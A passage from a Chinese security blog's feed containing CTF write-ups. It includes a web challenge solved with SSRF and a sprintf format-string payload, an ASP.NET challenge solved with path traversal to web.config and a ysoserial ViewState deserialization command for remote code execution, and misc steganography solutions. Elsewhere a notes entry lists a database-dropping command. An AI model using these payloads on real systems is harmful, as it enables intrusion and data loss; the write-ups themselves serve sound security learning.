class="string">"q1"</span>&gt;你希望以何种方式访问？GET？POST?&lt;/label&gt;&lt;/span&gt;</span><br><span class="line">                    &lt;input id=<span class="string">"q3"</span> name=<span class="string">"q3"</span> type=<span class="string">"text"</span>/&gt;</span><br><span class="line">                &lt;/li&gt;</span><br><span class="line">            &lt;/ol&gt;</span><br><span class="line">            &lt;button class="submit" type="submit" value="submit"&gt;提交&lt;/button&gt;</span><br><span class="line">            &lt;div class="controls"&gt;</span><br><span class="line">                &lt;button class="next"&gt;&lt;/button&gt;</span><br><span class="line">                &lt;div class="progress"&gt;&lt;/div&gt;</span><br><span class="line">                &lt;span class="number"&gt;</span><br><span class="line">&lt;span class="number-current"&gt;&lt;/span&gt;</span><br><span class="line">&lt;span class="number-total"&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">                &lt;span class="error-message"&gt;&lt;/span&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;span class="final-message"&gt;&lt;/span&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=<span class="string">"https://gem-love.com"</span> target=<span class="string">"_blank"</span>&gt;@颖奇L<span class="string">'Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">&lt;/section&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script type="text/javascript" src="js/classie.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script type="text/javascript" src="js/stepsForm.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">    var theForm = document.getElementById( '</span>theForm<span class="string">' );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    new stepsForm( theForm, &#123;</span></span><br><span class="line"><span class="string">        onSubmit : function( form ) &#123;</span></span><br><span class="line"><span class="string">            classie.addClass( theForm.querySelector( '</span>.simform-inner<span class="string">' ), '</span>hide<span class="string">' );</span></span><br><span class="line"><span class="string">            var messageEl = theForm.querySelector( '</span>.<span class="keyword">final</span>-message<span class="string">' );</span></span><br><span class="line"><span class="string">            form.submit();</span></span><br><span class="line"><span class="string">            messageEl.innerHTML = '</span>Ok...Let me have a check<span class="string">';</span></span><br><span class="line"><span class="string">            classie.addClass( messageEl, '</span>show<span class="string">' );</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125; );</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$filter1 = '</span>/^http:\/\/<span class="number">127</span>\<span class="number">.0</span>\<span class="number">.0</span>\<span class="number">.1</span>\<span class="comment">//i';</span></span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;  <span class="comment">//q1没什么用，但必须有值。</span></span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;<span class="comment">// q2终将影响 filter1、2的判定。被强行加上的帽子可以用’#‘或者’?params=‘等摘下。</span></span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];<span class="comment">// q3与最后的的sprintf有一定联系，需要加以利用。</span></span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2); <span class="comment">//一定要是http://127.0.0.1/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);<span class="comment">// 换句话就是不能有flag等字样 ffllaagg等也不行。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4); <span class="comment">// 除了GET、POST打头都不要</span></span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>); <span class="comment">// 第二个参数是use_include_path，这里false表示取消在include_path中寻找文件。</span></span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">    <span class="comment">/* 从函数文档中我们能了解到 </span></span><br><span class="line"><span class="comment">    ”the argument is treated as an integer and presented as a (signed) decimal number.“</span></span><br><span class="line"><span class="comment">    参数会被当做一个整数呈现为十六进制数</span></span><br><span class="line"><span class="comment">    但是前面还有个method我们可以利用，我们可以让q3=GET%s%</span></span><br><span class="line"><span class="comment">    构造出这样的字符串GET%s%%d，两个百分号让百分号的转义失去效果，而使其只有%s，有效地输出字符串。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而home长这样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"y1ng"</span>, sha1(md5(<span class="string">'y1ng'</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">'your_ip_address'</span>, md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\^|\~|&amp;|\|/"</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"forbidden"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/.?f.?l.?a.?g.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/.?a.?d.?m.?i.?n.?/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"You! are! not! my! admin!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^home$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"禁止套娃"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/home$/i"</span>, $_GET[<span class="string">'file'</span>]) <span class="keyword">or</span> preg_match(<span class="string">"/system$/i"</span>, $_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">'file'</span>].<span class="string">".php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">'file'</span>].<span class="string">".fxxkyou!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"现在访问的是 "</span>.$file . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审查代码后，可以了解我们不能直接得到flag.php等带有flag字样的文件，不能在home中得到admin文件，那么试着在system中获取admin文件。详情看代码中的注释。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=a&amp;q2=http://127.0.0.1/admin.php?b=&amp;q3=GET%s%</span><br></pre></td></tr></table></figure><p>在<code>system</code>中，通过这样的payload，我们获得了admin的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 加密函数</span></span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="comment">// 这两个cookie不能丢</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="comment"># 原来如此，这句话无论如何会存在。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        <span class="comment"># 两个cookie确认存在后进行下一步</span></span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">            <span class="comment">// 这是我们的目标</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    <span class="comment">//好家伙，上面这句话是陷阱</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">    <span class="comment"># random_bytes 是php7之后的事情</span></span><br><span class="line">    <span class="comment"># 这样的构造基本可以当作真随机</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看了一遍代码后第一个想到是mt的伪随机，但是这里的结构已经可以接近真随机了。</p><p>不过好在secret是存放在session中的，而session依赖于cookie中的sessionid，依靠这个关系我们把sessionid置空可以使该session对应键的值为NULL，这样data就是可控的了。</p><p>在本地使用aseEn函数（记得修改iv变量）构造出<code>decrypt=OGiyKXIyhghrDCtpomyQ6A==</code>，置空对应cookies，完事。</p><p><img src="https://z3.ax1x.com/2021/04/21/cbMwIU.png" alt="image-20210421132550213"></p><p>参考：</p><p><a href="https://www.cnblogs.com/qingwuyou/p/10687463.html" target="_blank" rel="noopener">解析php sprintf函数漏洞</a></p><p>拓展：</p><p><a href="https://www.jianshu.com/p/9c031dee57b7" target="_blank" rel="noopener">PHP trick</a></p><h3 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h3><p>ASP渣在此观望。</p><p>点击<code>click</code>，进入一个新页面，有了图片，改了图片的uri发现有四张图。</p><p>查看源码，发现<code>input</code>中的<code>value</code>类似<code>base</code>，而且是变化的。</p><p>用来包含图片的脚本可以包含其他不止图片的文件<code>ImgLoad.aspx?path=1.png</code></p><p>例如包含<code>web.config</code>? <code>ImgLoad.aspx?path=../../web.config</code>，直接用view-source下载下来。</p><p>这里已知一个RCE洞，可以使用<code>ysoserial</code>来反序列化。微软官方是这么描述的。</p><blockquote><h4 id="Microsoft-Exchange-验证密钥远程执行代码漏洞"><a href="#Microsoft-Exchange-验证密钥远程执行代码漏洞" class="headerlink" title="Microsoft Exchange 验证密钥远程执行代码漏洞"></a>Microsoft Exchange 验证密钥远程执行代码漏洞</h4><p>当服务器在安装时无法正确创建唯一密钥时，Microsoft Exchange Server 中将存在一个远程执行代码漏洞。</p><p>知道验证密钥后，具有邮箱的认证用户可以传递要由 Web 应用程序反序列化的任意对象，该 Web 应用程序以“系统”身份运行。</p></blockquote><p>现在利用刚刚的<code>web.config</code>构造payload反序列化后进行远程代码执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c <span class="string">"ExploitClass.cs;./System.dll;./System.Web.dll"</span> --generator=<span class="string">"CA0B0334"</span> --validationalg=<span class="string">"SHA1"</span> --validationkey=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span></span><br></pre></td></tr></table></figure><p>将payload用post方法传入<code>__VIEWSTATE</code>中，再使用<code>cmd</code>参数用来执行指令即可。</p><p>工具：</p><p><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial</a></p><p>参考：</p><p><a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BJDCTF-2nd&quot;&gt;&lt;a href=&quot;#BJDCTF-2nd&quot; class=&quot;headerlink&quot; title=&quot;BJDCTF 2nd&quot;&gt;&lt;/a&gt;BJDCTF 2nd&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;header
      
    
    </summary>
    
    
    
      <category term="BUU" scheme="https://ensuperb.github.io/tags/BUU/"/>
    
  </entry>
  
  <entry>
    <title>歌曲推荐 トルキア - 菅野洋子</title>
    <link href="https://ensuperb.github.io/posts/musicrecommendation2/"/>
    <id>https://ensuperb.github.io/posts/musicrecommendation2/</id>
    <published>2021-02-08T03:31:35.000Z</published>
    <updated>2021-02-26T05:04:09.049Z</updated>
    
    <content type="html"><![CDATA[<h1 id="トルキア-菅野洋子"><a href="#トルキア-菅野洋子" class="headerlink" title="トルキア - 菅野洋子"></a>トルキア - 菅野洋子</h1><blockquote><p>空灵、气势、宗教三种元素混合的如火如荼，适当欣赏可鼓舞人心。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=589809&auto=0&height=66"></iframe><blockquote><p>吾以此曲，策马奔腾！</p></blockquote><h1 id="Vogel-im-Kafig-澤野弘之"><a href="#Vogel-im-Kafig-澤野弘之" class="headerlink" title="Vogel im Kafig - 澤野弘之"></a>Vogel im Kafig - 澤野弘之</h1><audio controls="controls" autoplay>                    <source src="Vogel im Kafig.mp3" type="audio/mpeg">                  Enjoy.</audio>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;トルキア-菅野洋子&quot;&gt;&lt;a href=&quot;#トルキア-菅野洋子&quot; class=&quot;headerlink&quot; title=&quot;トルキア - 菅野洋子&quot;&gt;&lt;/a&gt;トルキア - 菅野洋子&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;空灵、气势、宗教三种元素混合的如火如荼，适当欣赏可
      
    
    </summary>
    
    
    
      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>2020-日常手记</title>
    <link href="https://ensuperb.github.io/posts/2020-daliylearning/"/>
    <id>https://ensuperb.github.io/posts/2020-daliylearning/</id>
    <published>2020-12-30T06:00:00.000Z</published>
    <updated>2020-10-17T05:07:20.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h1><p><code>mysqladmin -u root -p drop users</code>  管理员身份删除users库</p><p><code># mysqldump -u root -p &lt;database&gt; | gzip &gt; &lt;dat_0000000.gz&gt;</code>  使用root用户把数据库以<strong>压缩</strong>方式<code>备份</code></p><p><code># gzip &lt; &lt;dat_0000000.gz&gt; | mysqldump -u root -p &lt;database&gt;</code> 从<strong>压缩</strong>文件直接<code>恢复</code>库</p><p><code># mysqldump -u root -p &lt;database&gt; &gt; &lt;dat_000000.sql&gt;</code> 备份</p><p><code># mysqldump -u root -p &lt;database&gt; &lt; &lt;dat_000000.sql&gt;</code> 恢复</p><p>PowerShell 关闭 hyper-v <code>bcdedit /set hypervisorlaunchtype off</code> </p><h1 id="杂用"><a href="#杂用" class="headerlink" title="杂用"></a>杂用</h1><p>使用 <code>http://d0.ananas.chaoxing.com/download/</code> + <code>{objectid}</code> 可以下载超星课件中的资源。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;终端&quot;&gt;&lt;a href=&quot;#终端&quot; class=&quot;headerlink&quot; title=&quot;终端&quot;&gt;&lt;/a&gt;终端&lt;/h1&gt;&lt;p&gt;&lt;code&gt;mysqladmin -u root -p drop users&lt;/code&gt;  管理员身份删除users库&lt;/p&gt;
&lt;p&gt;&lt;c
      
    
    </summary>
    
    
      <category term="汇总" scheme="https://ensuperb.github.io/categories/%E6%B1%87%E6%80%BB/"/>
    
    
      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>XCTF-Misc 进阶 0x03</title>
    <link href="https://ensuperb.github.io/posts/XCTF-Misc-M-0x03/"/>
    <id>https://ensuperb.github.io/posts/XCTF-Misc-M-0x03/</id>
    <published>2020-12-13T07:18:55.000Z</published>
    <updated>2020-12-13T07:21:40.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc-进阶-0x03"><a href="#Misc-进阶-0x03" class="headerlink" title="Misc 进阶 0x03"></a>Misc 进阶 0x03</h1><hr><h2 id="hit-the-core"><a href="#hit-the-core" class="headerlink" title="hit-the-core"></a>hit-the-core</h2><blockquote><p>知识点：字符串隐写、编程能力</p></blockquote><p>使用Strings指令扫描此文件可打印字符。</p><p>使用hexdump -C 能看到更详细的内容。</p><p>发现可疑字符串，留意大写（后来发现是随着前面大写的顺序顺下去)</p><p>从第四个字符开始，每隔5个字符取一个字符。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc</span>&#123;<span class="keyword">bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n </span>kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;</span><br></pre></td></tr></table></figure><h2 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h2><blockquote><p>知识点：EXE逆向？？？</p></blockquote><p>完了几把，赢了。</p><p>但是这真的是正确的打开方式？先放放。</p><h2 id="banmabanma"><a href="#banmabanma" class="headerlink" title="banmabanma"></a>banmabanma</h2><blockquote><p>知识点：条形码</p></blockquote><p>看到此图，联想到<strong>条形码</strong>，使用手机<code>二维码阅读器</code>扫描得到结果。</p><p>编码格式：<code>CODE_39</code></p><p>编码信息：<code>FLAG IS TENSHINE</code></p><p>当然也有<a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">在线识别编码的工具</a>。</p><h2 id="embarrass"><a href="#embarrass" class="headerlink" title="embarrass"></a>embarrass</h2><blockquote><p>知识点：字符串、流量分析</p></blockquote><p>Wireshark打开文件，分析半天，没什么收获。</p><p>用<code>010editor</code>打开，搜索flag得到答案。</p><h2 id="Ditf"><a href="#Ditf" class="headerlink" title="Ditf"></a>Ditf</h2><blockquote><p>知识点：图片隐写、PNG格式、流量分析</p></blockquote><p>拿到图片，使用010editor打开发现下方有rar头，使用foremost分离，压缩包有密码，起初认为是伪加密，修改后发现不是，查看原图片有没有隐藏信息。使用<code>stegsolve</code>没发现什么线索，使用<code>TweakPNG</code>检查图片的CRC。报如下错误：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Incorrect crc <span class="keyword">for</span> IHDR chunk (is 38165a34, should be 7ebcdb1a)</span><br><span class="line">Invalid chunk<span class="built_in"> type </span>found at fhle position 989714.This may indicate garbage at the end of the file.</span><br></pre></td></tr></table></figure><p>尝试使用脚本爆破一下图片长宽：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">r"xxx"</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">"00000000.png"</span></span><br><span class="line">fr = open(file,<span class="string">'rb'</span>).read()</span><br><span class="line">data = bytearray(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = eval(<span class="string">'0x'</span>+str(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line"><span class="comment"># crc32key = eval(str(fr[29:33]).replace('\\x','').replace("b\'",'0x').replace("\'",''))</span></span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b'\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00')  #hex下copy grep hex </span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = bytearray(struct.pack(<span class="string">'&gt;i'</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">        height = bytearray(struct.pack(<span class="string">'&gt;i'</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            print(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = bytearray(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = open(file+<span class="string">'.png'</span>,<span class="string">'wb'</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close()</span><br></pre></td></tr></table></figure><p>得出正确的PNG高度，下方隐藏了RAR的密码。</p><p>使用wireshark打开解压的文件，过滤取HTTP报文。发现一个可疑的URL，名为<code>/kiss.png</code>，下方有疑似Base64密文，解开即可。</p><h2 id="Hear-with-your-Eyes"><a href="#Hear-with-your-Eyes" class="headerlink" 